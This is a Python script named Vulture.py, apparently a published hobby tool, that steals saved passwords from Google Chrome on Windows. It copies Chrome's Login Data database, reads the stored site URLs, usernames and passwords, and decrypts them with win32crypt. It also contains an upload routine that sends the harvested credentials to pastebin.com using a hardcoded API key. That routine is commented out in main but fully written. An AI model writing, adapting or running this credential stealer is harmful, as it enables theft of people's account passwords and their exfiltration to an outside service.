import sqlite3
import win32crypt
import getpass
import os
import argparse
import urllib.parse
import urllib.request
from tempfile import gettempdir
from subprocess import Popen
from shutil import copy

class Extractor:

	windows_username = os.getlogin()

	key = '6fa308892fe32aad6568444477f63761'
	url = 'http://pastebin.com/api/api_post.php'

	payload = ''

	def pluck_passwords(self):
		PATH = 'C:/Users/{}/AppData/Local/Google/Chrome/User Data/Default/Login Data'.format(self.windows_username)

		copy(PATH, gettempdir())

		PATH = gettempdir() + '\\Login Data'
		conn = sqlite3.connect(PATH)
		cur = conn.cursor()
		user_data = None

		try:
			cur.execute('SELECT action_url, username_value, password_value FROM logins')
			user_data = cur.fetchall()

		except Exception:
			print('\nError fetching passwords.')

		for r in user_data:
			password = win32crypt.CryptUnprotectData(r[2], None, None, None, 0)[1]

			password = password.decode("utf-8")
			username = r[1]
			host = r[0]

			string = '{0}\n\t{1}\n\t{2}\n\n'.format(host, username, password)
			self.payload += string

	def upload(self):
		 
		values = {
			'api_dev_key': self.key,
			'api_option': 'paste',
			'api_paste_code' : self.payload,
			'api_paste_private' : '1',
			'api_paste_name' : 'vulture.py | {}'.format(self.windows_username),
			'api_paste_expire_date' : 'N',
			'api_paste_format' : 'python',
		}
		 
		data = urllib.parse.urlencode(values)
		data = data.encode('utf-8')
		req = urllib.request.Request(self.url, data)
		with urllib.request.urlopen(req) as response:
		    the_page = response.read()
		self.link = the_page.decode('utf-8')

def main():

	print('''
       .-'`\-,/^\ .-.
      /    |  \  ( ee\   __
     |     |  |__/,--.`"`  `,
     |    /   .__/    `"""",/
     |   /    /  |
    .'.-'    /__/
   `"`| |';-;_`
	  |/ /-))))))


	Vulture.py written by Beagerr.

	https://www.github.com/beagerr/vulture.py
	  ''')

	vulture = Extractor()
	vulture.pluck_passwords()
	# vulture.upload()

	# os.system('start {}'.format(vulture.link))


if __name__ == '__main__':
	main()
